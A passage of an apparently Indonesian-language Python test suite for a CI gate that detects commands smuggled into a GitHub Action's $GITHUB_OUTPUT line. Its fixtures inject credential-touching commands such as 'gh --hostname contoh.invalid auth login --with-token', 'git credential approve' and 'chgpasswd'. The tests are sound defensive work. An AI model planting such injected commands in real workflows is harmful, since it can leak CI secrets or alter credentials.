        sub604 = klon(tmp, "sub604")
        berkas_aksi604 = os.path.join(
            sub604, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi604, encoding="utf-8") as f:
            isi_aksi604 = f.read()
        baris_aksi604 = [b for b in isi_aksi604.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru604 = isi_aksi604.replace(
                baris_aksi604,
                baris_aksi604.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(python3 -m sqlite3 -c select :memory:; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru604 != isi_aksi604, \
            "suntikan aksi604 tidak menembak"
        with open(berkas_aksi604, "w", encoding="utf-8") as f:
            f.write(isi_baru604)
        rc, out = jalan(sub604, [sys.executable, GERBANG, "--semua"])
        periksa("python3 -m sqlite3 -c select :memory:: "
                "gerbang lolos (Audit 1390)", rc == 0)
        shutil.rmtree(sub604, ignore_errors=True)
        sub605 = klon(tmp, "sub605")
        berkas_aksi605 = os.path.join(
            sub605, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi605, encoding="utf-8") as f:
            isi_aksi605 = f.read()
        baris_aksi605 = [b for b in isi_aksi605.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru605 = isi_aksi605.replace(
                baris_aksi605,
                baris_aksi605.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(python3 -m sqlite3 --version; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru605 != isi_aksi605, \
            "suntikan aksi605 tidak menembak"
        with open(berkas_aksi605, "w", encoding="utf-8") as f:
            f.write(isi_baru605)
        rc, out = jalan(sub605, [sys.executable, GERBANG, "--semua"])
        periksa("python3 -m sqlite3 --version: "
                "gerbang lolos (Audit 1390)", rc == 0)
        shutil.rmtree(sub605, ignore_errors=True)
        sub606 = klon(tmp, "sub606")
        berkas_aksi606 = os.path.join(
            sub606, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi606, encoding="utf-8") as f:
            isi_aksi606 = f.read()
        baris_aksi606 = [b for b in isi_aksi606.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru606 = isi_aksi606.replace(
                baris_aksi606,
                baris_aksi606.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(python3 -m gzip -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru606 != isi_aksi606, \
            "suntikan aksi606 tidak menembak"
        with open(berkas_aksi606, "w", encoding="utf-8") as f:
            f.write(isi_baru606)
        rc, out = jalan(sub606, [sys.executable, GERBANG, "--semua"])
        periksa("python3 -m gzip -: "
                "gerbang gagal (Audit 1391)", rc != 0)
        shutil.rmtree(sub606, ignore_errors=True)
        sub607 = klon(tmp, "sub607")
        berkas_aksi607 = os.path.join(
            sub607, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi607, encoding="utf-8") as f:
            isi_aksi607 = f.read()
        baris_aksi607 = [b for b in isi_aksi607.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru607 = isi_aksi607.replace(
                baris_aksi607,
                baris_aksi607.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(python3 -m json.tool -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru607 != isi_aksi607, \
            "suntikan aksi607 tidak menembak"
        with open(berkas_aksi607, "w", encoding="utf-8") as f:
            f.write(isi_baru607)
        rc, out = jalan(sub607, [sys.executable, GERBANG, "--semua"])
        periksa("python3 -m json.tool -: "
                "gerbang gagal (Audit 1391)", rc != 0)
        shutil.rmtree(sub607, ignore_errors=True)
        sub608 = klon(tmp, "sub608")
        berkas_aksi608 = os.path.join(
            sub608, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi608, encoding="utf-8") as f:
            isi_aksi608 = f.read()
        baris_aksi608 = [b for b in isi_aksi608.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru608 = isi_aksi608.replace(
                baris_aksi608,
                baris_aksi608.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(perl -Id skrip.pl; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru608 != isi_aksi608, \
            "suntikan aksi608 tidak menembak"
        with open(berkas_aksi608, "w", encoding="utf-8") as f:
            f.write(isi_baru608)
        rc, out = jalan(sub608, [sys.executable, GERBANG, "--semua"])
        periksa("perl -Id skrip.pl: "
                "gerbang lolos (Audit 1392)", rc == 0)
        shutil.rmtree(sub608, ignore_errors=True)
        sub609 = klon(tmp, "sub609")
        berkas_aksi609 = os.path.join(
            sub609, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi609, encoding="utf-8") as f:
            isi_aksi609 = f.read()
        baris_aksi609 = [b for b in isi_aksi609.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru609 = isi_aksi609.replace(
                baris_aksi609,
                baris_aksi609.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(perl -mdiagnostics skrip.pl; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru609 != isi_aksi609, \
            "suntikan aksi609 tidak menembak"
        with open(berkas_aksi609, "w", encoding="utf-8") as f:
            f.write(isi_baru609)
        rc, out = jalan(sub609, [sys.executable, GERBANG, "--semua"])
        periksa("perl -mdiagnostics skrip.pl: "
                "gerbang lolos (Audit 1392)", rc == 0)
        shutil.rmtree(sub609, ignore_errors=True)
        sub610 = klon(tmp, "sub610")
        berkas_aksi610 = os.path.join(
            sub610, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi610, encoding="utf-8") as f:
            isi_aksi610 = f.read()
        baris_aksi610 = [b for b in isi_aksi610.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru610 = isi_aksi610.replace(
                baris_aksi610,
                baris_aksi610.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(ffprobe -i berkas.mp4 -i pipe:; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru610 != isi_aksi610, \
            "suntikan aksi610 tidak menembak"
        with open(berkas_aksi610, "w", encoding="utf-8") as f:
            f.write(isi_baru610)
        rc, out = jalan(sub610, [sys.executable, GERBANG, "--semua"])
        periksa("ffprobe -i berkas.mp4 -i pipe:: "
                "gerbang lolos (Audit 1393)", rc == 0)
        shutil.rmtree(sub610, ignore_errors=True)
        sub611 = klon(tmp, "sub611")
        berkas_aksi611 = os.path.join(
            sub611, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi611, encoding="utf-8") as f:
            isi_aksi611 = f.read()
        baris_aksi611 = [b for b in isi_aksi611.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru611 = isi_aksi611.replace(
                baris_aksi611,
                baris_aksi611.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(debugfs -z -f citra.img; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru611 != isi_aksi611, \
            "suntikan aksi611 tidak menembak"
        with open(berkas_aksi611, "w", encoding="utf-8") as f:
            f.write(isi_baru611)
        rc, out = jalan(sub611, [sys.executable, GERBANG, "--semua"])
        periksa("debugfs -z -f citra.img: "
                "gerbang gagal (Audit 1394)", rc != 0)
        shutil.rmtree(sub611, ignore_errors=True)
        sub612 = klon(tmp, "sub612")
        berkas_aksi612 = os.path.join(
            sub612, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi612, encoding="utf-8") as f:
            isi_aksi612 = f.read()
        baris_aksi612 = [b for b in isi_aksi612.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru612 = isi_aksi612.replace(
                baris_aksi612,
                baris_aksi612.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(debugfs -zf citra.img; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru612 != isi_aksi612, \
            "suntikan aksi612 tidak menembak"
        with open(berkas_aksi612, "w", encoding="utf-8") as f:
            f.write(isi_baru612)
        rc, out = jalan(sub612, [sys.executable, GERBANG, "--semua"])
        periksa("debugfs -zf citra.img: "
                "gerbang gagal (Audit 1394)", rc != 0)
        shutil.rmtree(sub612, ignore_errors=True)
        sub613 = klon(tmp, "sub613")
        berkas_aksi613 = os.path.join(
            sub613, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi613, encoding="utf-8") as f:
            isi_aksi613 = f.read()
        baris_aksi613 = [b for b in isi_aksi613.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru613 = isi_aksi613.replace(
                baris_aksi613,
                baris_aksi613.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gh --hostname contoh.invalid auth login --with-token; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru613 != isi_aksi613, \
            "suntikan aksi613 tidak menembak"
        with open(berkas_aksi613, "w", encoding="utf-8") as f:
            f.write(isi_baru613)
        rc, out = jalan(sub613, [sys.executable, GERBANG, "--semua"])
        periksa("gh --hostname contoh.invalid auth login --with-token: "
                "gerbang gagal (Audit 1395)", rc != 0)
        shutil.rmtree(sub613, ignore_errors=True)
        sub614 = klon(tmp, "sub614")
        berkas_aksi614 = os.path.join(
            sub614, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi614, encoding="utf-8") as f:
            isi_aksi614 = f.read()
        baris_aksi614 = [b for b in isi_aksi614.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru614 = isi_aksi614.replace(
                baris_aksi614,
                baris_aksi614.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(/bin/cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru614 != isi_aksi614, \
            "suntikan aksi614 tidak menembak"
        with open(berkas_aksi614, "w", encoding="utf-8") as f:
            f.write(isi_baru614)
        rc, out = jalan(sub614, [sys.executable, GERBANG, "--semua"])
        periksa("/bin/cat: "
                "gerbang gagal (Audit 1396)", rc != 0)
        shutil.rmtree(sub614, ignore_errors=True)
        sub615 = klon(tmp, "sub615")
        berkas_aksi615 = os.path.join(
            sub615, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi615, encoding="utf-8") as f:
            isi_aksi615 = f.read()
        baris_aksi615 = [b for b in isi_aksi615.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru615 = isi_aksi615.replace(
                baris_aksi615,
                baris_aksi615.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(/usr/bin/openssl sha256; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru615 != isi_aksi615, \
            "suntikan aksi615 tidak menembak"
        with open(berkas_aksi615, "w", encoding="utf-8") as f:
            f.write(isi_baru615)
        rc, out = jalan(sub615, [sys.executable, GERBANG, "--semua"])
        periksa("/usr/bin/openssl sha256: "
                "gerbang gagal (Audit 1396)", rc != 0)
        shutil.rmtree(sub615, ignore_errors=True)
        sub616 = klon(tmp, "sub616")
        berkas_aksi616 = os.path.join(
            sub616, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi616, encoding="utf-8") as f:
            isi_aksi616 = f.read()
        baris_aksi616 = [b for b in isi_aksi616.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru616 = isi_aksi616.replace(
                baris_aksi616,
                baris_aksi616.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(setsid /bin/cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru616 != isi_aksi616, \
            "suntikan aksi616 tidak menembak"
        with open(berkas_aksi616, "w", encoding="utf-8") as f:
            f.write(isi_baru616)
        rc, out = jalan(sub616, [sys.executable, GERBANG, "--semua"])
        periksa("setsid /bin/cat: "
                "gerbang gagal (Audit 1396)", rc != 0)
        shutil.rmtree(sub616, ignore_errors=True)
        sub617 = klon(tmp, "sub617")
        berkas_aksi617 = os.path.join(
            sub617, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi617, encoding="utf-8") as f:
            isi_aksi617 = f.read()
        baris_aksi617 = [b for b in isi_aksi617.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru617 = isi_aksi617.replace(
                baris_aksi617,
                baris_aksi617.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(chgpasswd; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru617 != isi_aksi617, \
            "suntikan aksi617 tidak menembak"
        with open(berkas_aksi617, "w", encoding="utf-8") as f:
            f.write(isi_baru617)
        rc, out = jalan(sub617, [sys.executable, GERBANG, "--semua"])
        periksa("chgpasswd: "
                "gerbang gagal (Audit 1397)", rc != 0)
        shutil.rmtree(sub617, ignore_errors=True)
        sub618 = klon(tmp, "sub618")
        berkas_aksi618 = os.path.join(
            sub618, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi618, encoding="utf-8") as f:
            isi_aksi618 = f.read()
        baris_aksi618 = [b for b in isi_aksi618.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru618 = isi_aksi618.replace(
                baris_aksi618,
                baris_aksi618.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(chgpasswd berkasuji; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru618 != isi_aksi618, \
            "suntikan aksi618 tidak menembak"
        with open(berkas_aksi618, "w", encoding="utf-8") as f:
            f.write(isi_baru618)
        rc, out = jalan(sub618, [sys.executable, GERBANG, "--semua"])
        periksa("chgpasswd berkasuji: "
                "gerbang gagal (Audit 1397)", rc != 0)
        shutil.rmtree(sub618, ignore_errors=True)
        sub619 = klon(tmp, "sub619")
        berkas_aksi619 = os.path.join(
            sub619, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi619, encoding="utf-8") as f:
            isi_aksi619 = f.read()
        baris_aksi619 = [b for b in isi_aksi619.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru619 = isi_aksi619.replace(
                baris_aksi619,
                baris_aksi619.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pl2pm; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru619 != isi_aksi619, \
            "suntikan aksi619 tidak menembak"
        with open(berkas_aksi619, "w", encoding="utf-8") as f:
            f.write(isi_baru619)
        rc, out = jalan(sub619, [sys.executable, GERBANG, "--semua"])
        periksa("pl2pm: "
                "gerbang gagal (Audit 1398)", rc != 0)
        shutil.rmtree(sub619, ignore_errors=True)
        sub620 = klon(tmp, "sub620")
        berkas_aksi620 = os.path.join(
            sub620, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi620, encoding="utf-8") as f:
            isi_aksi620 = f.read()
        baris_aksi620 = [b for b in isi_aksi620.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru620 = isi_aksi620.replace(
                baris_aksi620,
                baris_aksi620.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git credential approve; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru620 != isi_aksi620, \
            "suntikan aksi620 tidak menembak"
        with open(berkas_aksi620, "w", encoding="utf-8") as f:
            f.write(isi_baru620)
        rc, out = jalan(sub620, [sys.executable, GERBANG, "--semua"])
        periksa("git credential approve: "
                "gerbang gagal (Audit 1399)", rc != 0)
        shutil.rmtree(sub620, ignore_errors=True)
        sub621 = klon(tmp, "sub621")
        berkas_aksi621 = os.path.join(
            sub621, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi621, encoding="utf-8") as f:
            isi_aksi621 = f.read()
        baris_aksi621 = [b for b in isi_aksi621.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru621 = isi_aksi621.replace(
                baris_aksi621,
                baris_aksi621.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git format-patch --stdin; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru621 != isi_aksi621, \
            "suntikan aksi621 tidak menembak"
        with open(berkas_aksi621, "w", encoding="utf-8") as f:
            f.write(isi_baru621)
        rc, out = jalan(sub621, [sys.executable, GERBANG, "--semua"])
        periksa("git format-patch --stdin: "
                "gerbang gagal (Audit 1400)", rc != 0)
        shutil.rmtree(sub621, ignore_errors=True)
        sub622 = klon(tmp, "sub622")
        berkas_aksi622 = os.path.join(
            sub622, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi622, encoding="utf-8") as f:
            isi_aksi622 = f.read()
        baris_aksi622 = [b for b in isi_aksi622.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru622 = isi_aksi622.replace(
                baris_aksi622,
                baris_aksi622.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git add -p; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru622 != isi_aksi622, \
            "suntikan aksi622 tidak menembak"
        with open(berkas_aksi622, "w", encoding="utf-8") as f:
            f.write(isi_baru622)
        rc, out = jalan(sub622, [sys.executable, GERBANG, "--semua"])
        periksa("git add -p: "
                "gerbang gagal (Audit 1401)", rc != 0)
        shutil.rmtree(sub622, ignore_errors=True)
        sub623 = klon(tmp, "sub623")
        berkas_aksi623 = os.path.join(
            sub623, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi623, encoding="utf-8") as f:
            isi_aksi623 = f.read()
        baris_aksi623 = [b for b in isi_aksi623.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru623 = isi_aksi623.replace(
                baris_aksi623,
                baris_aksi623.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(git clean -i; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru623 != isi_aksi623, \
            "suntikan aksi623 tidak menembak"
        with open(berkas_aksi623, "w", encoding="utf-8") as f:
            f.write(isi_baru623)
        rc, out = jalan(sub623, [sys.executable, GERBANG, "--semua"])
        periksa("git clean -i: "
                "gerbang gagal (Audit 1401)", rc != 0)
        shutil.rmtree(sub623, ignore_errors=True)
        sub624 = klon(tmp, "sub624")
        berkas_aksi624 = os.path.join(
            sub624, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi624, encoding="utf-8") as f:
            isi_aksi624 = f.read()
        baris_aksi624 = [b for b in isi_aksi624.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru624 = isi_aksi624.replace(
                baris_aksi624,
                baris_aksi624.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl sess_id; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru624 != isi_aksi624, \
            "suntikan aksi624 tidak menembak"
        with open(berkas_aksi624, "w", encoding="utf-8") as f:
            f.write(isi_baru624)
        rc, out = jalan(sub624, [sys.executable, GERBANG, "--semua"])
        periksa("openssl sess_id: "
                "gerbang gagal (Audit 1402)", rc != 0)
        shutil.rmtree(sub624, ignore_errors=True)
        sub625 = klon(tmp, "sub625")
        berkas_aksi625 = os.path.join(
            sub625, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi625, encoding="utf-8") as f:
            isi_aksi625 = f.read()
        baris_aksi625 = [b for b in isi_aksi625.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru625 = isi_aksi625.replace(
                baris_aksi625,
                baris_aksi625.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl asn1parse berkas.der; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru625 != isi_aksi625, \
            "suntikan aksi625 tidak menembak"
        with open(berkas_aksi625, "w", encoding="utf-8") as f:
            f.write(isi_baru625)
        rc, out = jalan(sub625, [sys.executable, GERBANG, "--semua"])
        periksa("openssl asn1parse berkas.der: "
                "gerbang lolos (Audit 1402)", rc == 0)
        shutil.rmtree(sub625, ignore_errors=True)
        sub626 = klon(tmp, "sub626")
        berkas_aksi626 = os.path.join(
            sub626, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi626, encoding="utf-8") as f:
            isi_aksi626 = f.read()
        baris_aksi626 = [b for b in isi_aksi626.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru626 = isi_aksi626.replace(
                baris_aksi626,
                baris_aksi626.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl req -new -key kunci.pem; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru626 != isi_aksi626, \
            "suntikan aksi626 tidak menembak"
        with open(berkas_aksi626, "w", encoding="utf-8") as f:
            f.write(isi_baru626)
        rc, out = jalan(sub626, [sys.executable, GERBANG, "--semua"])
        periksa("openssl req -new -key kunci.pem: "
                "gerbang gagal (Audit 1403)", rc != 0)
        shutil.rmtree(sub626, ignore_errors=True)
        sub627 = klon(tmp, "sub627")
        berkas_aksi627 = os.path.join(
            sub627, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi627, encoding="utf-8") as f:
            isi_aksi627 = f.read()
        baris_aksi627 = [b for b in isi_aksi627.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru627 = isi_aksi627.replace(
                baris_aksi627,
                baris_aksi627.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pdftoppm - hasil; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru627 != isi_aksi627, \
            "suntikan aksi627 tidak menembak"
        with open(berkas_aksi627, "w", encoding="utf-8") as f:
            f.write(isi_baru627)
        rc, out = jalan(sub627, [sys.executable, GERBANG, "--semua"])
        periksa("pdftoppm - hasil: "
                "gerbang gagal (Audit 1404)", rc != 0)
        shutil.rmtree(sub627, ignore_errors=True)
        sub628 = klon(tmp, "sub628")
        berkas_aksi628 = os.path.join(
            sub628, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi628, encoding="utf-8") as f:
            isi_aksi628 = f.read()
        baris_aksi628 = [b for b in isi_aksi628.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru628 = isi_aksi628.replace(
                baris_aksi628,
                baris_aksi628.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pdftocairo -png - hasil.png; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru628 != isi_aksi628, \
            "suntikan aksi628 tidak menembak"
        with open(berkas_aksi628, "w", encoding="utf-8") as f:
            f.write(isi_baru628)
        rc, out = jalan(sub628, [sys.executable, GERBANG, "--semua"])
        periksa("pdftocairo -png - hasil.png: "
                "gerbang gagal (Audit 1404)", rc != 0)
        shutil.rmtree(sub628, ignore_errors=True)
        sub629 = klon(tmp, "sub629")
        berkas_aksi629 = os.path.join(
            sub629, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi629, encoding="utf-8") as f:
            isi_aksi629 = f.read()
        baris_aksi629 = [b for b in isi_aksi629.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru629 = isi_aksi629.replace(
                baris_aksi629,
                baris_aksi629.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(npm init; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru629 != isi_aksi629, \
            "suntikan aksi629 tidak menembak"
        with open(berkas_aksi629, "w", encoding="utf-8") as f:
            f.write(isi_baru629)
        rc, out = jalan(sub629, [sys.executable, GERBANG, "--semua"])
        periksa("npm init: "
                "gerbang gagal (Audit 1405)", rc != 0)
        shutil.rmtree(sub629, ignore_errors=True)
        sub630 = klon(tmp, "sub630")
        berkas_aksi630 = os.path.join(
            sub630, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi630, encoding="utf-8") as f:
            isi_aksi630 = f.read()
        baris_aksi630 = [b for b in isi_aksi630.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru630 = isi_aksi630.replace(
                baris_aksi630,
                baris_aksi630.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(strings -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru630 != isi_aksi630, \
            "suntikan aksi630 tidak menembak"
        with open(berkas_aksi630, "w", encoding="utf-8") as f:
            f.write(isi_baru630)
        rc, out = jalan(sub630, [sys.executable, GERBANG, "--semua"])
        periksa("strings -: "
                "gerbang lolos (Audit 1406)", rc == 0)
        shutil.rmtree(sub630, ignore_errors=True)
        sub631 = klon(tmp, "sub631")
        berkas_aksi631 = os.path.join(
            sub631, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi631, encoding="utf-8") as f:
            isi_aksi631 = f.read()
        baris_aksi631 = [b for b in isi_aksi631.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru631 = isi_aksi631.replace(
                baris_aksi631,
                baris_aksi631.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cpan -v; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru631 != isi_aksi631, \
            "suntikan aksi631 tidak menembak"
        with open(berkas_aksi631, "w", encoding="utf-8") as f:
            f.write(isi_baru631)
        rc, out = jalan(sub631, [sys.executable, GERBANG, "--semua"])
        periksa("cpan -v: "
                "gerbang lolos (Audit 1407)", rc == 0)
        shutil.rmtree(sub631, ignore_errors=True)
        sub632 = klon(tmp, "sub632")
        berkas_aksi632 = os.path.join(
            sub632, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi632, encoding="utf-8") as f:
            isi_aksi632 = f.read()
        baris_aksi632 = [b for b in isi_aksi632.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru632 = isi_aksi632.replace(
                baris_aksi632,
                baris_aksi632.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(utmpdump -h; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru632 != isi_aksi632, \
            "suntikan aksi632 tidak menembak"
        with open(berkas_aksi632, "w", encoding="utf-8") as f:
            f.write(isi_baru632)
        rc, out = jalan(sub632, [sys.executable, GERBANG, "--semua"])
        periksa("utmpdump -h: "
                "gerbang lolos (Audit 1407)", rc == 0)
        shutil.rmtree(sub632, ignore_errors=True)

        sub633 = klon(tmp, "sub633")
        berkas_aksi633 = os.path.join(
            sub633, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi633, encoding="utf-8") as f:
            isi_aksi633 = f.read()
        baris_aksi633 = [b for b in isi_aksi633.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru633 = isi_aksi633.replace(
                baris_aksi633,
                baris_aksi633.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(X=/a/b cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru633 != isi_aksi633, \
            "suntikan aksi633 tidak menembak"
        with open(berkas_aksi633, "w", encoding="utf-8") as f:
            f.write(isi_baru633)
        rc, out = jalan(sub633, [sys.executable, GERBANG, "--semua"])
        periksa("X=/a/b cat: "
                "gerbang gagal (Audit 1408)", rc != 0)
        shutil.rmtree(sub633, ignore_errors=True)
        sub634 = klon(tmp, "sub634")
        berkas_aksi634 = os.path.join(
            sub634, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi634, encoding="utf-8") as f:
            isi_aksi634 = f.read()
        baris_aksi634 = [b for b in isi_aksi634.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru634 = isi_aksi634.replace(
                baris_aksi634,
                baris_aksi634.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(FOO=/bin/cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru634 != isi_aksi634, \
            "suntikan aksi634 tidak menembak"
        with open(berkas_aksi634, "w", encoding="utf-8") as f:
            f.write(isi_baru634)
        rc, out = jalan(sub634, [sys.executable, GERBANG, "--semua"])
        periksa("FOO=/bin/cat: "
                "gerbang lolos (Audit 1408)", rc == 0)
        shutil.rmtree(sub634, ignore_errors=True)
        sub635 = klon(tmp, "sub635")
        berkas_aksi635 = os.path.join(
            sub635, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi635, encoding="utf-8") as f:
            isi_aksi635 = f.read()
        baris_aksi635 = [b for b in isi_aksi635.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru635 = isi_aksi635.replace(
                baris_aksi635,
                baris_aksi635.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl asn1parse; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru635 != isi_aksi635, \
            "suntikan aksi635 tidak menembak"
        with open(berkas_aksi635, "w", encoding="utf-8") as f:
            f.write(isi_baru635)
        rc, out = jalan(sub635, [sys.executable, GERBANG, "--semua"])
        periksa("openssl asn1parse: "
                "gerbang gagal (Audit 1409)", rc != 0)
        shutil.rmtree(sub635, ignore_errors=True)
        sub636 = klon(tmp, "sub636")
        berkas_aksi636 = os.path.join(
            sub636, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi636, encoding="utf-8") as f:
            isi_aksi636 = f.read()
